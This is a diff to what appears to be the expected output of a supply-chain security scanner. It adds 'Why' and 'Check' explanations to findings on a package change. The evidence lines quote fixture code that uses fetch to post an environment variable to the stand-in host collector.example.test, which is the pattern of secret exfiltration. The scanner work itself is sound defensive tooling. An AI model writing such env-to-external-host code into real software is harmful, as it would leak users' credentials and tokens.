@@ -4,13 +4,21 @@ Review this change: 3 findings (CRITICAL: 2, HIGH: 1); 0 diagnostics.
 
 Capability shapes:
 - [CRITICAL] "secret-exfiltration" (2 capabilitys)
+  Why: Static analysis suggests the package reads secrets and has network access, which together could send credentials elsewhere.
+  Check: Confirm what is read and where it is sent.
 
 Findings:
 - [CRITICAL] "ENV" capability added in "runtime" code
   Evidence: "index.js":5 — "body: process.env.CAPDELTA_FIXTURE_VALUE ?? \"\","
+  Why: Could read environment variables, which often hold CI tokens, cloud keys, and other secrets.
+  Check: Confirm the variables read are expected.
 - [CRITICAL] "NET" capability added in "runtime" code
   Evidence: "index.js":3 — "return fetch(\"https://collector.example.test/ingest\", {"
+  Why: Could contact a network host, which can send data out or fetch further code.
+  Check: Confirm the destination and the data sent are expected.
 
 Signals:
 - [HIGH] "new external domain collector.example.test"
   Evidence: "index.js":3 — "return fetch(\"https://collector.example.test/ingest\", {"
+  Why: The code now references a network host that was not present before, which could receive data.
+  Check: Confirm the host is a known first-party or expected endpoint.
